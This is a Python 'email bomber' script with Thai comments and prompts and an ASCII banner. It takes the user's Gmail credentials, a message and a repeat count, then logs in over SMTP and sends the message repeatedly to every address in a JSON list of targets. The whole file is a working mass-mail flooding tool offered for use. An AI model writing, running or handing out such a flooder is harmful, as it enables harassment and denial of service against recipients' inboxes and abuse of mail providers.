import smtplib
import time
import json
import os

# แสดงข้อความ
print("\033[1;31m_________    __        __        ____        ________    __                                             \033[1;m")
print("\033[1;34m|########|  |##\      /##|      /####\      |########|  |##|              โดย @everydaycodings                  \033[1;m")
print("\033[1;34m|##|____    |###\ __ /###|     /##/\##\        |##|     |##|              สร้างด้วยโค้ด             \033[1;m")
print("\033[1;34m|########|  |##| |##| |##|    /########\       |##|     |##|         ____   __       ____   __  ___     \033[1;m")
print("\033[1;31m|##|_____   |##|      |##|   /##/    \##\    __|##|__   |##|_______   |__| |  | |\/|  |__| |__  |__|    \033[1;m")
print("\033[1;31m|########|  |##|      |##|  /##/      \##\  |########|  |##########| _|__| |__| |  | _|__| |__  |  \    \033[1;m")

# กำหนดเส้นทางไปยังไฟล์ email.json ที่อยู่ในโฟลเดอร์ function/email/
email_json_path = 'function/email/email.json'

# เปิดไฟล์ email.json และโหลดข้อมูล
with open(email_json_path, 'r') as f:
    data = json.load(f)

# รับข้อมูลจากผู้ใช้
email = input("กรุณากรอกที่อยู่อีเมลของคุณ (gmail): ")
password = input("กรุณากรอกรหัสผ่านของอีเมลของคุณ: ")
message = input("กรุณากรอกข้อความที่จะส่ง: ")
message_relode = int(input("คุณต้องการส่งข้อความจำนวนกี่ครั้ง?: "))

# ลูปเพื่อส่งอีเมล
for bomb_email in data['emails']:
    for x in range(0, message_relode):
        try:
            mail = smtplib.SMTP('smtp.gmail.com', 587)
            mail.ehlo()
            mail.starttls()
            mail.login(email, password)
            mail.sendmail(email, bomb_email, message)
            print("ส่งข้อความไปยัง {}".format(bomb_email))
            mail.close()
        except Exception as e:
            print(f"เกิดข้อผิดพลาดในการส่งอีเมลไปยัง {bomb_email}: {e}")
        time.sleep(1)

print("ส่งข้อความเสร็จเรียบร้อย")